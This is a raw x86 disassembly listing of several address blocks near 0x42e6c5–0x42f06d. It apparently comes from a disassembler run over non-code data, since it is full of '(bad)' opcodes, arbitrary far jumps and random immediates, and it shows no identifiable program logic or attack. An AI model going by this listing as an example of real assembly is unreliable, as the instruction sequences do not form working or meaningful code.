  42e6c5:	fild   QWORD PTR [edi-0x29bc7c0b]
  42e6cb:	dec    ebx
  42e6cc:	push   es
  42e6cd:	or     dl,cl
  42e6cf:	lods   al,BYTE PTR ds:[esi]
  42e6d0:	jns    0x42e675
  42e6d2:	call   0xa90f:0xcb4f159d
  42e6d9:	xor    BYTE PTR [esi+0x52],al
  42e6dc:	mov    esi,0xf91f5e3d
  42e6e1:	add    dl,bl
  42e6e3:	mov    ds:0x839c7406,al
  42e6e8:	adc    DWORD PTR [ecx+0xdcfd5dd],ebx
  42e6ee:	imul   ebp,DWORD PTR ds:0xac07db54,0x3b3ad1b2
  42e6f8:	inc    ecx
  42e6f9:	pop    ebp
  42e6fa:	lea    ecx,[eax-0x7b]
  42e6fd:	xchg   edx,eax
  42e6fe:	sbb    BYTE PTR [eax-0x3f],ah
  42e701:	scas   eax,DWORD PTR es:[edi]
  42e702:	fidivr WORD PTR [edi]
  42e704:	scas   eax,DWORD PTR es:[edi]
  42e705:	cld    
  42e706:	or     al,0xe6
  42e708:	clc    
  42e709:	test   BYTE PTR [ebx],0xae
  42e70c:	scas   al,BYTE PTR es:[edi]
  42e70d:	data16 xor al,BYTE PTR [ecx+0x5e]
  42e711:	inc    edx
  42e712:	mov    al,ds:0xf047b8b5
  42e717:	lods   al,BYTE PTR ds:[esi]
  42e718:	or     eax,0x25ffed93
  42e71d:	sub    ebp,DWORD PTR [edi+0x78]
  42e720:	sub    esp,ebx
  42e722:	cdq    
  42e723:	in     al,0xad
  42e725:	lods   al,BYTE PTR ds:[esi]
  42e726:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e727:	inc    ebx
  42e728:	test   eax,0xc5cddca3
  42e72d:	mov    al,ds:0xc7090b0d
  42e732:	dec    esp
  42e733:	fdivr  DWORD PTR [ebx+0x1a]
  42e736:	sub    edi,DWORD PTR [ebx+0x6894e4a3]
  42e73c:	sub    DWORD PTR [esi-0x50],ebx
  42e73f:	lahf   
  42e740:	mov    ds:0x721b2081,al
  42e745:	pop    esi
  42e746:	mov    ds:0xb0bb397c,al
  42e74b:	sbb    al,0x2c
  42e74d:	sahf   
  42e74e:	shrd   DWORD PTR [edi-0x22],ecx,cl
  42e752:	fldenv [eax-0x7e]
  42e755:	add    eax,0x62176415
  42e75a:	out    0xfa,al
  42e75c:	adc    al,0x7b
  42e75e:	cdq    
  42e75f:	fsub   st,st(2)
  42e761:	xlat   BYTE PTR ds:[ebx]
  42e762:	mov    ds:0x862dabc9,eax
  42e767:	sbb    eax,0x878306d6
  42e76c:	fs add BYTE PTR gs:[eax],al
	...
  42e7d4:	add    BYTE PTR [eax],al
  42e7d6:	pop    edx
  42e7d7:	cmp    DWORD PTR [esi+0x2d],ecx
  42e7da:	outs   dx,DWORD PTR ds:[esi]
  42e7db:	jg     0x42e858
  42e7dd:	jg     0x42e843
  42e7df:	sub    BYTE PTR [esi],cl
  42e7e1:	ficom  DWORD PTR [edi+0x1a]
  42e7e4:	sub    DWORD PTR [edi],eax
  42e7e6:	repnz add DWORD PTR [bx+si],eax
  42e7ea:	add    BYTE PTR [ecx],al
  42e7ec:	add    BYTE PTR [eax],al
  42e7ee:	shl    BYTE PTR [ebx-0x22],0x7a
  42e7f2:	mov    esi,0xac0bf53e
  42e7f7:	enter  0xc561,0xa
  42e7fb:	test   BYTE PTR [ebp+0x62],al
  42e7fe:	push   edi
  42e7ff:	mov    cl,0x81
  42e801:	imul   BYTE PTR [eax-0x4942a2cc]
  42e807:	dec    ecx
  42e808:	fwait
  42e809:	or     edi,edi
  42e80b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e80c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e80d:	es (bad) 
  42e80f:	or     al,bl
  42e811:	push   ss
  42e812:	xchg   esi,eax
  42e813:	mov    dl,0x13
  42e815:	cdq    
  42e816:	stos   BYTE PTR es:[edi],al
  42e817:	push   edi
  42e818:	bound  edx,QWORD PTR [edx+0x3f]
  42e81b:	mov    DWORD PTR [edi-0x4b],ecx
  42e81e:	ret    0x80dd
  42e821:	push   0x7d
  42e823:	shl    DWORD PTR [ecx-0x79],1
  42e826:	and    ebx,DWORD PTR [esi-0x7f02e0ec]
  42e82c:	loopne 0x42e864
  42e82e:	(bad)  
  42e82f:	cmp    eax,0x89577197
  42e834:	icebp  
  42e835:	push   ebp
  42e836:	test   al,0x74
  42e838:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e839:	sbb    al,0x29
  42e83b:	and    esp,DWORD PTR [edi+0x7260c6e8]
  42e841:	xor    al,BYTE PTR [esi-0x17bfe0a1]
  42e847:	mov    bh,0x56
  42e849:	jbe    0x42e7e4
  42e84b:	pop    ebx
  42e84c:	ins    BYTE PTR es:[edi],dx
  42e84d:	shr    BYTE PTR [esi],cl
  42e84f:	push   esp
  42e850:	nop
  42e851:	in     eax,dx
  42e852:	and    dl,bl
  42e854:	loop   0x42e8d1
  42e856:	inc    ecx
  42e857:	mov    ebx,0xbf8bc4a8
  42e85c:	pop    edi
  42e85d:	pop    ss
  42e85e:	mov    ebp,0x9cac48f3
  42e863:	int3   
  42e864:	idiv   BYTE PTR [esi-0x73]
  42e867:	pop    es
  42e868:	or     ebx,DWORD PTR [ebp+0x2f7b8190]
  42e86e:	and    ebx,eax
  42e870:	jno    0x42e864
  42e872:	scas   al,BYTE PTR es:[edi]
  42e873:	pop    ebp
  42e874:	push   0xd84e1bad
  42e879:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e87b:	push   ebx
  42e87c:	lahf   
  42e87d:	sbb    eax,0x1962738
  42e882:	xchg   ecx,eax
  42e883:	jl     0x42e85e
  42e885:	fs gs pushf 
  42e888:	add    ebp,esi
  42e88a:	(bad)  
  42e88b:	fsub   QWORD PTR [ebx]
  42e88d:	adc    al,0x6c
  42e88f:	lock dec esp
  42e891:	nop
  42e892:	jno    0x42e833
  42e894:	fadd   QWORD PTR [ecx-0x320280c4]
  42e89a:	ins    DWORD PTR es:[edi],dx
  42e89b:	push   es
  42e89c:	cmp    al,0x69
  42e89e:	push   0xffffffe3
  42e8a0:	dec    ecx
  42e8a2:	outs   dx,BYTE PTR ds:[esi]
  42e8a3:	jnp    0x42e8d6
  42e8a5:	sbb    DWORD PTR ds:0x33e3bae3,ebp
  42e8ab:	xchg   DWORD PTR [edi+0xba3561e],esp
  42e8b1:	xchg   ecx,eax
  42e8b2:	jnp    0x42e91a
  42e8b4:	push   cs
  42e8b5:	(bad)  
  42e8b6:	aas    
  42e8b7:	icebp  
  42e8b8:	ret    0x194b
  42e8bb:	imul   eax,DWORD PTR ds:0x350f09c0,0xffffff8d
  42e8c2:	repz cdq 
  42e8c4:	adc    DWORD PTR [esi-0x19],ebx
  42e8c7:	addr16 fmulp st(4),st
  42e8ca:	mov    esp,0x88ecaf17
  42e8cf:	push   ds
  42e8d0:	loopne 0x42e87b
  42e8d2:	aad    0xc6
  42e8d4:	call   0x5bdb:0x912fa966
  42e8db:	jne    0x42e957
  42e8dd:	push   0xcc972d00
  42e8e2:	into   
  42e8e3:	pushf  
  42e8e4:	aaa    
  42e8e5:	pop    ecx
  42e8e6:	(bad)  
  42e8e7:	cmp    al,0xac
  42e8e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e8ea:	cmc    
  42e8eb:	pusha  
  42e8ec:	mov    ah,0x24
	...
  42e956:	ret    
  42e957:	ja     0x42e9b9
  42e959:	and    al,0xf4
  42e95b:	aaa    
  42e95c:	(bad)  
  42e95d:	div    DWORD PTR [ecx-0x3edc07d5]
  42e963:	and    BYTE PTR [edx+0x1f3679e],0x0
  42e96a:	add    BYTE PTR [ecx],al
  42e96c:	add    BYTE PTR [eax],al
  42e96e:	jo     0x42e9b1
  42e970:	outs   dx,DWORD PTR ds:[esi]
  42e971:	xor    eax,0x888cff06
  42e976:	sahf   
  42e977:	push   0x5f
  42e979:	mov    ebp,0xda3ea1fe
  42e97e:	push   0xffffffdc
  42e980:	lahf   
  42e981:	jo     0x42e9a8
  42e983:	rol    DWORD PTR [edi],0x1e
  42e986:	mov    WORD PTR [eax],ds
  42e988:	out    0x1a,al
  42e98a:	sbb    bh,BYTE PTR [ecx]
  42e98c:	mov    ah,ch
  42e98e:	(bad)  
  42e98f:	das    
  42e990:	push   esp
  42e991:	jb     0x42e9ef
  42e993:	push   cs
  42e994:	jg     0x42e9e4
  42e996:	(bad)  
  42e997:	in     al,dx
  42e998:	mov    al,BYTE PTR [eax-0x2bddf967]
  42e99e:	clc    
  42e99f:	cmp    al,0x92
  42e9a1:	pop    ds
  42e9a2:	xchg   ebx,eax
  42e9a3:	pop    edx
  42e9a4:	xchg   BYTE PTR ds:0xd4b1d6f3,ch
  42e9aa:	cmc    
  42e9ab:	push   ds
  42e9ac:	mov    ecx,0x5ee53edd
  42e9b1:	push   ds
  42e9b2:	pop    esp
  42e9b3:	pop    ecx
  42e9b4:	cwde   
  42e9b5:	xor    DWORD PTR [ecx],edi
  42e9b7:	mov    ss:0xb5dc75a1,eax
  42e9bd:	dec    edi
  42e9be:	hlt    
  42e9bf:	mov    eax,ds:0xf164a735
  42e9c4:	inc    esp
  42e9c5:	mov    ch,0x4d
  42e9c7:	push   ecx
  42e9c8:	ret    0x87bf
  42e9cb:	sbb    al,0x36
  42e9cd:	cmp    DWORD PTR [eax+0x6479c636],eax
  42e9d3:	push   edi
  42e9d4:	mov    dl,0xb9
  42e9d6:	jmp    0x42e95a
  42e9d8:	sub    al,0xdb
  42e9da:	shr    DWORD PTR [esi],1
  42e9dc:	sbb    edx,ebx
  42e9de:	cmp    bl,BYTE PTR [ecx+edx*2-0x65]
  42e9e2:	jne    0x42ea3f
  42e9e4:	cmp    eax,0xae5c3135
  42e9e9:	les    ecx,FWORD PTR [ebx+esi*2]
  42e9ec:	loopne 0x42e9a4
  42e9ee:	push   esp
  42e9ef:	jne    0x42e9e3
  42e9f1:	bound  ecx,QWORD PTR [ebp-0xc]
  42e9f4:	es mov edi,0x3004c897
  42e9fa:	ins    BYTE PTR es:[edi],dx
  42e9fb:	adc    dl,BYTE PTR [edx]
  42e9fd:	push   0xdcacf304
  42ea02:	mov    bl,0x8e
  42ea04:	imul   edx,esp,0x926a0ec
  42ea0a:	sbb    al,0x8c
  42ea0c:	mov    edi,edi
  42ea0e:	cmp    bh,al
  42ea10:	fs jne 0x42e9e9
  42ea13:	cmp    eax,0xbb20da80
  42ea18:	pop    ds
  42ea19:	sbb    bh,ch
  42ea1b:	cmp    DWORD PTR [ebx-0x10],esp
  42ea1e:	retf   
  42ea1f:	push   ebx
  42ea20:	fbstp  TBYTE PTR cs:[ebp-0x20]
  42ea24:	inc    esi
  42ea25:	xchg   ebp,eax
  42ea26:	rcl    al,1
  42ea28:	dec    eax
  42ea29:	sub    BYTE PTR [edx],dh
  42ea2b:	test   BYTE PTR [ebx],dl
  42ea2d:	mov    al,0xb1
  42ea2f:	sub    dl,BYTE PTR [esi+0x7010bbcc]
  42ea35:	or     BYTE PTR [esi+0x4e],ah
  42ea38:	push   edx
  42ea39:	aaa    
  42ea3a:	pop    esi
  42ea3b:	cmc    
  42ea3c:	jmp    0x5382d803
  42ea41:	push   DWORD PTR [eax]
  42ea43:	mov    dl,0x99
  42ea45:	fsubr  st(3),st
  42ea47:	fnstcw WORD PTR [ebx]
  42ea49:	jno    0x42ea1f
  42ea4b:	add    eax,0x139f1b60
  42ea50:	jp     0x42ea29
  42ea52:	fmul   DWORD PTR [ebx+esi*4+0x4e8fa0c3]
  42ea59:	popf   
  42ea5a:	jmp    0xca9bd24a
  42ea5f:	and    BYTE PTR [edi-0x2238482e],0xb1
  42ea66:	mov    BYTE PTR [edx-0x1447b437],dh
  42ea6c:	out    0x60,eax
	...
  42ead6:	in     eax,0xba
  42ead8:	xchg   edx,eax
  42ead9:	jecxz  0x42eaba
  42eadb:	jmp    0x42ead2
  42eadd:	mov    esi,0x66dc160c
  42eae2:	(bad)  
  42eae3:	retf   
  42eae4:	sub    al,cl
  42eae6:	addr16 hlt 
  42eae8:	add    DWORD PTR [eax],eax
  42eaea:	add    BYTE PTR [ecx],al
  42eaec:	add    BYTE PTR [eax],al
  42eaee:	xchg   edi,eax
  42eaef:	push   esp
  42eaf0:	mov    ebx,ecx
  42eaf2:	pop    eax
  42eaf3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42eaf4:	stos   DWORD PTR es:[edi],eax
  42eaf5:	jp     0x42eaf1
  42eaf7:	pop    edx
  42eaf8:	mov    dl,BYTE PTR [ebx-0x4a704240]
  42eafe:	mov    BYTE PTR [ebx-0x6e25381a],bh
  42eb04:	adc    dh,BYTE PTR ss:[edx]
  42eb07:	not    DWORD PTR [ebx-0x6e]
  42eb0a:	(bad)  
  42eb0b:	outs   dx,BYTE PTR ds:[esi]
  42eb0c:	sar    BYTE PTR [ebx],cl
  42eb0e:	mov    ah,dh
  42eb10:	dec    esp
  42eb11:	daa    
  42eb12:	jl     0x42ea9f
  42eb14:	pusha  
  42eb15:	sub    eax,0x464e0023
  42eb1a:	ins    BYTE PTR es:[edi],dx
  42eb1b:	sbb    DWORD PTR [eax],esp
  42eb1d:	cmp    al,0x90
  42eb1f:	repz xchg ah,dl
  42eb22:	jecxz  0x42eb8a
  42eb24:	or     BYTE PTR [esi],ah
  42eb26:	ins    BYTE PTR es:[edi],dx
  42eb27:	sahf   
  42eb28:	(bad)  
  42eb29:	push   0x24d63a29
  42eb2e:	push   ecx
  42eb2f:	scas   eax,DWORD PTR es:[edi]
  42eb30:	and    BYTE PTR [edx],bl
  42eb32:	and    ch,BYTE PTR [edx]
  42eb34:	into   
  42eb35:	dec    esi
  42eb36:	push   cs
  42eb37:	xor    bh,BYTE PTR [edx-0x17]
  42eb3a:	push   edi
  42eb3b:	pop    es
  42eb3c:	loope  0x42eb06
  42eb3e:	mov    ds:0xf7461f4b,al
  42eb43:	scas   eax,DWORD PTR es:[edi]
  42eb44:	push   cs
  42eb45:	mov    ds:0x7466ff05,eax
  42eb4a:	inc    ebx
  42eb4b:	pop    edx
  42eb4c:	push   esi
  42eb4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42eb4e:	pop    eax
  42eb4f:	push   0x33f2d7f0
  42eb54:	and    eax,0xcac3cb60
  42eb59:	pop    esp
  42eb5a:	pop    esp
  42eb5b:	and    edx,edi
  42eb5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42eb5e:	sub    BYTE PTR [edi-0x17],bh
  42eb61:	dec    esi
  42eb62:	pop    esi
  42eb63:	imul   ebx,esi,0x20
  42eb66:	add    DWORD PTR [esi],edi
  42eb68:	push   es
  42eb69:	xchg   BYTE PTR [eax+0x5eb426da],bl
  42eb6f:	mov    ds:0x5e9d39c6,al
  42eb74:	loopne 0x42eb5e
  42eb76:	jp     0x42eb9f
  42eb78:	in     al,dx
  42eb79:	out    dx,eax
  42eb7a:	add    BYTE PTR [ebx+edi*8+0x3dbdaa2],dl
  42eb81:	and    eax,0xfd5a277a
  42eb86:	mov    eax,ds:0xd4fced68
  42eb8b:	mov    BYTE PTR [ebx+0x1],bl
  42eb8e:	dec    edi
  42eb8f:	pop    eax
  42eb90:	imul   edx,DWORD PTR [ecx-0xf0db7a0],0x59
  42eb97:	sbb    DWORD PTR [eax+0x2],edi
  42eb9a:	mov    ecx,0x602ae4bd
  42eb9f:	cmp    BYTE PTR [edi],0x96
  42eba2:	out    0xd8,eax
  42eba4:	mov    dh,0x20
  42eba6:	dec    edi
  42eba7:	and    al,BYTE PTR [eax-0x1547d83c]
  42ebad:	std    
  42ebae:	imul   esi,DWORD PTR [ebx],0x71f69d24
  42ebb4:	icebp  
  42ebb5:	stos   BYTE PTR es:[edi],al
  42ebb6:	popa   
  42ebb7:	scas   al,BYTE PTR es:[edi]
  42ebb8:	out    dx,eax
  42ebb9:	repnz mov ss,WORD PTR [edi]
  42ebbc:	imul   esp,DWORD PTR [ebp+eax*4-0x77c7d40a],0x4b902b5b
  42ebc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ebc8:	xor    ebp,DWORD PTR [edi-0x57a727c3]
  42ebce:	ins    BYTE PTR es:[edi],dx
  42ebcf:	sub    al,0x36
  42ebd1:	add    esp,ebp
  42ebd3:	mov    al,ds:0xa08ba5aa
  42ebd8:	fwait
  42ebd9:	cmc    
  42ebda:	call   0x6cb6b31b
  42ebdf:	(bad)  [esi]
  42ebe1:	sub    BYTE PTR [ecx+0x1d4f41cb],cl
  42ebe7:	sti    
  42ebe8:	jge    0x42eb95
  42ebea:	jns    0x42eb77
  42ebec:	fadd   QWORD PTR [esi]
	...
  42ec56:	jle    0x42ec99
  42ec58:	jne    0xfc41bb9d
  42ec5e:	pusha  
  42ec5f:	popf   
  42ec60:	pop    ecx
  42ec61:	adc    DWORD PTR [eax-0x36],0xf567f426
  42ec68:	add    DWORD PTR [eax],eax
  42ec6a:	add    BYTE PTR [ecx],al
  42ec6c:	add    BYTE PTR [eax],al
  42ec6e:	xor    DWORD PTR [ebp+0x7129b5a9],edx
  42ec74:	stc    
  42ec75:	div    BYTE PTR [esi-0x74]
  42ec78:	jmp    FWORD PTR [ecx-0x2782acd5]
  42ec7e:	sbb    eax,0xc2922211
  42ec83:	xchg   DWORD PTR [esi],edx
  42ec85:	shld   edx,edx,cl
  42ec88:	mov    ds:0xf56bd401,al
  42ec8d:	push   edi
  42ec8e:	lds    esi,FWORD PTR [ebx+0x9]
  42ec91:	push   ebx
  42ec92:	ret    0xd540
  42ec95:	sub    DWORD PTR [ebp+0x3c],edi
  42ec98:	test   al,0xef
  42ec9a:	mul    edi
  42ec9c:	mov    al,ds:0xea24ece1
  42eca1:	mul    DWORD PTR [esi]
  42eca3:	ins    BYTE PTR es:[edi],dx
  42eca4:	push   ds
  42eca5:	push   edx
  42eca7:	je     0x42ecdb
  42eca9:	lds    eax,FWORD PTR [edx-0x108b390d]
  42ecaf:	stos   BYTE PTR es:[edi],al
  42ecb0:	mov    ebp,0xbaf73b61
  42ecb5:	out    dx,eax
  42ecb6:	sbb    ah,BYTE PTR [edx]
  42ecb8:	shr    BYTE PTR ds:0xf07c0056,1
  42ecbe:	mov    bh,0xe3
  42ecc0:	mov    ebx,0xe671dc47
  42ecc5:	mov    edi,0xc07607f1
  42ecca:	jecxz  0x42ecc5
  42eccc:	mov    esi,0x297ee79
  42ecd1:	ds jae 0x42ecf3
  42ecd4:	mov    bh,0x9c
  42ecd6:	std    
  42ecd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ecd8:	pop    eax
  42ecd9:	loopne 0x42ecc9
  42ecdb:	loope  0x42ed10
  42ecdd:	pop    edx
  42ecde:	cmp    ch,bl
  42ece0:	fsubr  st,st(2)
  42ece2:	(bad)  
  42ece3:	int3   
  42ece4:	jmp    DWORD PTR [esi+0x3928d372]
  42ecea:	call   0xdf344962
  42ecef:	pop    ecx
  42ecf0:	pushf  
  42ecf1:	(bad)  
  42ecf3:	push   0x6e
  42ecf5:	xchg   DWORD PTR [ebx],eax
  42ecf7:	adc    bh,dl
  42ecf9:	xor    al,0x3f
  42ecfb:	inc    ebp
  42ecfc:	loope  0x42ecd1
  42ecfe:	inc    ebx
  42ecff:	and    cl,BYTE PTR [edi]
  42ed01:	sub    al,0x8b
  42ed03:	and    BYTE PTR [eax+0x75],ah
  42ed06:	mov    ds:0xf1a7cb86,al
  42ed0b:	sti    
  42ed0c:	test   al,0x16
  42ed0e:	retf   0xda39
  42ed11:	dec    ebp
  42ed12:	js     0x42ed18
  42ed14:	aas    
  42ed15:	add    ebp,edi
  42ed17:	jnp    0x42ed7d
  42ed19:	inc    ebp
  42ed1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ed1b:	and    edx,DWORD PTR [ebp+0x6b]
  42ed1e:	add    BYTE PTR [ecx+0x25eb2f62],ah
  42ed24:	sahf   
  42ed25:	scas   eax,DWORD PTR es:[edi]
  42ed26:	imul   BYTE PTR [esi-0x44]
  42ed29:	pop    ecx
  42ed2a:	dec    eax
  42ed2b:	xchg   BYTE PTR [ebx+0x6d],ch
  42ed2e:	inc    eax
  42ed2f:	fdivr  st(4),st
  42ed31:	bound  esi,QWORD PTR [di+0x503c]
  42ed36:	jmp    0xa346:0xbe8dfef3
  42ed3d:	xchg   ebp,eax
  42ed3e:	xchg   BYTE PTR [edi],dl
  42ed40:	mov    al,ds:0x87d4f7e9
  42ed45:	aad    0x66
  42ed47:	ret    0xd82a
  42ed4a:	and    eax,0x62e4c28b
  42ed4f:	push   ebp
  42ed50:	mov    bh,al
  42ed52:	(bad)  [edi]
  42ed54:	in     al,0x63
  42ed56:	inc    ecx
  42ed57:	inc    ebp
  42ed58:	jo     0x42ed1b
  42ed5a:	jne    0x42edd7
  42ed5c:	iret   
  42ed5d:	in     eax,0x6c
  42ed5f:	or     dl,0xaa
  42ed62:	and    eax,0x2c7fddf7
  42ed67:	sti    
  42ed68:	mov    DWORD PTR [edx+0x38293737],ecx
	...
  42edd6:	sub    dh,dh
  42edd8:	scas   eax,DWORD PTR es:[edi]
  42edd9:	fdivr  st,st(7)
  42eddb:	fnstcw WORD PTR [edi-0xa]
  42edde:	jecxz  0x42ee12
  42ede0:	test   DWORD PTR [edx-0x478ecb35],esp
  42ede6:	test   BYTE PTR [bx+di],0x0
  42edea:	add    BYTE PTR [ecx],al
  42edec:	add    BYTE PTR [eax],al
  42edee:	stc    
  42edef:	jmp    0xdffb:0xa51f94a
  42edf6:	rcr    DWORD PTR [edi],cl
  42edf8:	pop    esi
  42edf9:	push   edi
  42edfa:	xchg   edx,eax
  42edfb:	pop    esi
  42edfc:	dec    edx
  42edfd:	xor    eax,0xd766b66d
  42ee02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ee03:	scas   eax,DWORD PTR es:[edi]
  42ee04:	xchg   ebx,eax
  42ee05:	xchg   ebp,eax
  42ee06:	xchg   esi,eax
  42ee07:	popa   
  42ee08:	rcr    DWORD PTR [edi-0x3f55898],1
  42ee0e:	fdivr  QWORD PTR [eax-0x2e5251e]
  42ee14:	and    dh,BYTE PTR ds:0x929b2c59
  42ee1a:	arpl   WORD PTR [edi+0x285ea20d],si
  42ee20:	clc    
  42ee21:	fs pusha 
  42ee23:	or     dh,BYTE PTR [edi-0x3af96225]
  42ee29:	ror    BYTE PTR [ebp+0x27d4838b],1
  42ee2f:	fnstcw WORD PTR [esi+ecx*4]
  42ee32:	test   eax,0x27a798e9
  42ee37:	scas   al,BYTE PTR es:[edi]
  42ee38:	cs (bad) 
  42ee3b:	mov    al,ds:0x45b5f2bb
  42ee40:	cdq    
  42ee41:	mov    cl,0x3e
  42ee43:	dec    BYTE PTR [ecx+0x4b95d2a4]
  42ee49:	test   BYTE PTR [edx+eiz*2-0x1820527a],al
  42ee50:	xchg   ebx,eax
  42ee51:	lahf   
  42ee52:	fadd   QWORD PTR [edx+0x3e9d6b3b]
  42ee58:	adc    DWORD PTR [ebx-0x6e0295d9],edx
  42ee5e:	jmp    0x12a85d72
  42ee63:	mov    al,ds:0x6c7c9e1b
  42ee68:	and    ecx,ebx
  42ee6a:	jae    0x42ee71
  42ee6c:	addr16 jns 0x42ee3b
  42ee6f:	adc    eax,0x8a2e28f5
  42ee74:	cmp    ch,BYTE PTR [ebp+eiz*4-0x6abd9196]
  42ee7b:	je     0x42ee69
  42ee7d:	mov    eax,0x34850ddc
  42ee82:	nop
  42ee83:	xor    DWORD PTR [ecx-0x4be9a72d],eax
  42ee89:	add    edx,DWORD PTR [edx]
  42ee8b:	sbb    edx,edi
  42ee8d:	pop    ebx
  42ee8e:	fmul   QWORD PTR [eax+0x2356968c]
  42ee94:	push   edx
  42ee95:	push   eax
  42ee96:	or     edi,DWORD PTR [eax-0x61]
  42ee99:	loope  0x42ee48
  42ee9b:	or     BYTE PTR [esi],0x61
  42ee9e:	adc    bl,0xc5
  42eea1:	ret    
  42eea2:	cli    
  42eea3:	iret   
  42eea4:	adc    edi,edx
  42eea6:	jo     0x42eee3
  42eea8:	fidivr DWORD PTR [eax-0x5c]
  42eeab:	xor    ch,BYTE PTR [edi-0x75e77047]
  42eeb1:	fsub   QWORD PTR [ebp+0x230e5ad7]
  42eeb7:	jmp    0x42ef31
  42eeb9:	mov    bl,0x1c
  42eebb:	inc    esi
  42eebc:	dec    esi
  42eebd:	pop    edx
  42eebe:	push   0xc8409bcf
  42eec3:	dec    esi
  42eec4:	mov    edi,0xa8ee2ce
  42eec9:	adc    DWORD PTR [eax-0x4e],edx
  42eecc:	int    0x5a
  42eece:	lea    edx,[esi+0x4e]
  42eed1:	daa    
  42eed2:	pop    ecx
  42eed3:	mul    cl
  42eed5:	dec    edx
  42eed6:	ret    0xba44
  42eed9:	pop    esp
  42eeda:	rcr    DWORD PTR [edi+eax*2-0x2401570f],cl
  42eee1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42eee2:	or     eax,0xf633d8d4
  42eee7:	xchg   BYTE PTR [eax-0x64ba4dc7],ah
  42eeed:	cmp    BYTE PTR [eax],al
	...
  42ef53:	add    BYTE PTR [eax],al
  42ef55:	add    bl,al
  42ef57:	add    cl,BYTE PTR [eax]
  42ef59:	xor    eax,0xf6ff3fc9
  42ef5e:	jb     0x42ef9c
  42ef60:	jae    0x42ef87
  42ef62:	leave  
  42ef63:	pop    ss
  42ef64:	jmp    0x0:0x1f76727
  42ef6b:	add    DWORD PTR [eax],eax
  42ef6d:	add    ch,dl
  42ef6f:	push   ecx
  42ef70:	popf   
  42ef71:	push   0xfa2caa23
  42ef76:	or     al,dh
  42ef78:	fst    QWORD PTR [ebx+0x41]
  42ef7b:	test   al,0xeb
  42ef7d:	xor    BYTE PTR [ebp+eiz*4+0x6c],dl
  42ef81:	add    eax,0x1b4f31ee
  42ef86:	fild   WORD PTR [edx+0x28817a0d]
  42ef8c:	and    DWORD PTR [ebx-0x1d5e6947],ebx
  42ef92:	push   esp
  42ef93:	sahf   
  42ef94:	stos   BYTE PTR es:[edi],al
  42ef95:	and    al,BYTE PTR [edi]
  42ef97:	pop    eax
  42ef98:	jmp    FWORD PTR [esi+ebp*2]
  42ef9b:	cmp    edx,DWORD PTR [ebx-0x1d]
  42ef9e:	iret   
  42ef9f:	push   ss
  42efa0:	scas   eax,DWORD PTR es:[edi]
  42efa1:	jle    0x42ef7f
  42efa3:	aaa    
  42efa4:	pop    ebx
  42efa5:	mov    ds:0x8c7aa96d,eax
  42efaa:	mov    dh,BYTE PTR [edx]
  42efac:	sub    al,0x8c
  42efae:	adc    eax,0x81b1b4af
  42efb3:	jae    0x42ef67
  42efb5:	(bad)  
  42efb6:	ficom  WORD PTR [edi+0x5]
  42efb9:	mov    ah,0x4f
  42efbb:	fwait
  42efbc:	ret    0x2ac4
  42efbf:	cld    
  42efc0:	pop    esi
  42efc1:	mov    ebp,0x2a3f94ec
  42efc6:	arpl   WORD PTR [edi],dx
  42efc8:	dec    edi
  42efc9:	dec    eax
  42efca:	sbb    eax,0x854f6eef
  42efcf:	dec    esp
  42efd0:	and    ch,BYTE PTR [ecx]
  42efd2:	push   ds
  42efd3:	stos   DWORD PTR es:[edi],eax
  42efd4:	jp     0x42f054
  42efd6:	push   ebp
  42efd7:	push   ss
  42efd8:	push   ds
  42efd9:	inc    eax
  42efda:	fsub   DWORD PTR [eax-0x5a]
  42efde:	cs mov al,0xd9
  42efe1:	rcr    BYTE PTR [edi+0x3415cd3d],0x98
  42efe8:	dec    esp
  42efe9:	clc    
  42efea:	adc    BYTE PTR [ebx+0x3b],bh
  42efed:	cmp    al,0x85
  42efef:	xchg   ecx,eax
  42eff0:	mov    al,ds:0xf6709359
  42eff5:	or     DWORD PTR [eax-0x1f],eax
  42eff8:	fwait
  42eff9:	sbb    al,0x47
  42effb:	push   ebp
  42effc:	outs   dx,DWORD PTR ds:[esi]
  42effd:	pop    eax
  42effe:	sub    al,0x7f
  42f000:	cmp    al,0x63
  42f002:	js     0x42efce
  42f004:	outs   dx,DWORD PTR ds:[esi]
  42f005:	pop    ss
  42f006:	out    dx,al
  42f007:	cmp    dh,BYTE PTR [esi]
  42f009:	cmp    DWORD PTR ds:0xc68c427d,eax
  42f00f:	xchg   esi,eax
  42f011:	mov    ebx,0xe2237f5
  42f016:	cmp    dl,BYTE PTR [esi-0x1b]
  42f019:	jle    0x42efa7
  42f01b:	cwde   
  42f01c:	call   0x7f38:0x5749cf06
  42f023:	mov    cl,0x88
  42f025:	out    dx,al
  42f026:	repz fldcw WORD PTR [ecx]
  42f029:	shl    BYTE PTR [esi],cl
  42f02b:	xor    cl,0xb1
  42f02e:	pop    ebp
  42f02f:	add    ecx,esi
  42f031:	inc    ebx
  42f032:	xor    BYTE PTR [ebx+0x4c],cl
  42f035:	enter  0x2c72,0xbf
  42f039:	and    eax,0x51903ca2
  42f03e:	or     dl,cl
  42f040:	test   DWORD PTR [eax+0x30d4fb0b],edi
  42f046:	ror    BYTE PTR [ecx],cl
  42f048:	dec    esi
  42f049:	mov    al,0x6
  42f04b:	aas    
  42f04c:	jmp    0x6199:0x4c01d704
  42f053:	loop   0x42f096
  42f055:	shr    DWORD PTR [edx],cl
  42f057:	sbb    esp,DWORD PTR [edx+ecx*4-0x47f3005e]
  42f05e:	jle    0x42f0af
  42f060:	inc    esi
  42f061:	push   esp
  42f062:	in     eax,0x9f
  42f064:	jns    0x42f003
  42f066:	fbstp  TBYTE PTR [eax-0x20]
  42f069:	jp     0x42f0b2
  42f06b:	aaa    
  42f06c:	pusha  
  42f06d:	adc    DWORD PTR [eax],eax
	...
